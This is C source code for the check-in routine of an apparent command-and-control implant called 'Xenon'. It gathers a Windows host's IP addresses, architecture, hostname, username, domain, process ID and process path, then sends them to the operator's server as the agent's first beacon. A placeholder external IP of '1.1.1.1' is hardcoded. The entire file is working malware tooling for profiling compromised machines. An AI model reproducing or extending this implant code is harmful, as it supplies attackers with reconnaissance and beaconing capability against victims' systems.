#include "Xenon.h"
#include "Checkin.h"
#include "Task.h"

#include <lm.h>
#include <lmwksta.h>
#include <iphlpapi.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "netapi32.lib")

// Getting all the IP addresses.
UINT32 *CheckinGetIPAddress(UINT32 *numberOfIPs)
{
    PMIB_IPADDRTABLE pIPAddrTable;
    DWORD dwSize = 0;
    DWORD dwRetVal = 0;
    IN_ADDR IPAddr;
    LPVOID lpMsgBuf;

    pIPAddrTable = (MIB_IPADDRTABLE *)LocalAlloc(LPTR, sizeof(MIB_IPADDRTABLE));
    if (pIPAddrTable)
    {
        if (GetIpAddrTable(pIPAddrTable, &dwSize, 0) == ERROR_INSUFFICIENT_BUFFER)
        {
            LocalFree(pIPAddrTable);
            pIPAddrTable = (MIB_IPADDRTABLE *)LocalAlloc(LPTR, dwSize);
        }
        if (pIPAddrTable == NULL)
            return NULL;
    }

    else
        return NULL;

    if ((dwRetVal = GetIpAddrTable(pIPAddrTable, &dwSize, 0)) != NO_ERROR)
    {
        LocalFree(pIPAddrTable);
        return NULL;
    } 
    else 
    {
        *numberOfIPs = (UINT32)pIPAddrTable->dwNumEntries;
    }

    UINT32 *tableOfIPs = (UINT32 *)LocalAlloc(LPTR, (*numberOfIPs) * sizeof(UINT32));
    for (UINT32 i = 0; i < *numberOfIPs; i++)
    {
        IPAddr.S_un.S_addr = (u_long)pIPAddrTable->table[i].dwAddr;
        tableOfIPs[i] = BYTESWAP32(IPAddr.S_un.S_addr);
    }

    if (pIPAddrTable)
        LocalFree(pIPAddrTable);

    return tableOfIPs;
}

// Getting the current architecture
BYTE CheckinGetArch()
{
    SYSTEM_INFO systemInfo;
    GetNativeSystemInfo(&systemInfo);
    if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
    {
        return 0x64;
    }

    return 0x86;
}

// Getting the current hostname
PCHAR CheckinGetHostname()
{
    LPSTR data = NULL;
    DWORD dataLen = 0;
    const char *hostnameRep = "N/A";
    if (!GetComputerNameExA(ComputerNameNetBIOS, NULL, &dataLen))
    {
        if (data = (LPSTR)LocalAlloc(LPTR, dataLen))
        {
            GetComputerNameExA(ComputerNameNetBIOS, data, &dataLen);
            hostnameRep = data;
        }
    }
    return (char *)hostnameRep;
}

// Getting the username of the current user
char *CheckinGetUserName()
{
    LPSTR data = NULL;
    DWORD dataLen = 0;
    const char *userName = "N/A";
    if (!GetUserNameA(NULL, &dataLen))
    {
        if (data = (LPSTR)LocalAlloc(LPTR, dataLen))
        {
            GetUserNameA(data, &dataLen);
            userName = data;
        }
    }
    return (char *)userName;
}

// Getting the domain from the machine
LPWSTR CheckinGetDomain()
{
    DWORD dwLevel = 102;
    LPWKSTA_INFO_102 pBuf = NULL;
    PWCHAR domain = NULL;
    NET_API_STATUS nStatus;
    LPWSTR pszServerName = NULL;
    nStatus = NetWkstaGetInfo(pszServerName, dwLevel, (LPBYTE *)&pBuf);
    if (nStatus == NERR_Success)
    {
        DWORD length = lstrlenW(pBuf->wki102_langroup);
        domain = (PWCHAR)LocalAlloc(LPTR, sizeof(WCHAR) * (length + 1));    // +1 null terminator
        memcpy(domain, pBuf->wki102_langroup, sizeof(WCHAR) * length);
        domain[length] = L'\0'; // Explicitly set the null terminator.
    }
    if (pBuf != NULL)
        NetApiBufferFree(pBuf);
    return domain;
}

// Getting the current OS Name (not implemented)
char *CheckinGetOsName()
{
    return (PCHAR) "Windows";
}

// Getting the current process name
char *CheckinGetCurrentProcName()
{
    char *processName = NULL;
    HANDLE handle = GetCurrentProcess();
    if (handle)
    {
        DWORD buffSize = 1024;
        CHAR buffer[1024];
        if (QueryFullProcessImageNameA(handle, 0, buffer, &buffSize))
        {
            processName = (char *)LocalAlloc(LPTR, buffSize + 1);
            memcpy(processName, buffer, buffSize);
        }
        CloseHandle(handle);
    }
    return processName;
}

BOOL CheckinSend(PPARSER output)
{
    /*
    Format of checkin package:
        UUID
        Action (checkin byte)
        UUID
        Nb of IP
        IP
        Size OS
        OS
        Architecture
        Size Hostname
        HostName
        Size Username
        Username
        Size Domain
        Domaine
        PID
        Size ProcessN
        Process Name
        Size ExternIP
        Extern IP
    */

    BOOL bStatus        = FALSE;
    UINT32 numberOfIPs  = 0;
    // uuid + action
    PPackage checkinData = NULL;
    
    checkinData = PackageInit(CHECKIN, TRUE);

    // UUID
    PackageAddString(checkinData, (PCHAR)xenonConfig->agentID, FALSE);

    // IP addresses;
    UINT32 *tableOfIPs = CheckinGetIPAddress(&numberOfIPs);
    PackageAddInt32(checkinData, numberOfIPs);
    for (UINT32 i = 0; i < numberOfIPs; i++)
        PackageAddInt32(checkinData, tableOfIPs[i]);

    // OS
    PackageAddString(checkinData, CheckinGetOsName(), TRUE);
    // Arch
    PackageAddByte(checkinData, CheckinGetArch());
    // Hostname
    PackageAddString(checkinData, CheckinGetHostname(), TRUE);
    // Username
    PackageAddString(checkinData, CheckinGetUserName(), TRUE);
    // Domain
    PackageAddWString(checkinData, CheckinGetDomain(), TRUE);
    // PID
    PackageAddInt32(checkinData, GetCurrentProcessId());
    // ProcessName
    PackageAddString(checkinData, CheckinGetCurrentProcName(), TRUE);
    // External IP 
    PackageAddString(checkinData, (PCHAR) "1.1.1.1", TRUE);    // TODO


    bStatus = PackageSend(checkinData, output);      // Send the request, fill the parser output
    // if (!bStatus || !output)
    if (!bStatus)
    {
        _err("Failed to send package");
        goto cleanup;
    }

    bStatus = TRUE;

cleanup:
    PackageDestroy(checkinData);

    return bStatus;
}